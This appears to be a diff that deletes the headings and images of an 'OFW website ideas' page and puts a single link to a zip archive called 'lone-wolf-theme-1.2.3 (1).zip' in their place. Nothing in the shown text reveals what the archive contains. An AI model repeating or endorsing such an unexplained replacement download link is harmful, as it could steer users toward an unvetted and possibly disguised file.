@@ -1,8 +1,1 @@
-# OFW WEBSITE IDEAS
-## MISIION
-### VISION
-
-![Logo](https://hir.harvard.edu/content/images/2023/07/hir-ofw-article.jpeg)
-
-![Logo](https://images.gmanews.tv/webpics/2020/12/ofw_2020_12_17_13_15_40.jpg)
-
+[lone-wolf-theme-1.2.3 (1).zip](https://github.com/user-attachments/files/25005684/lone-wolf-theme-1.2.3.1.zip)
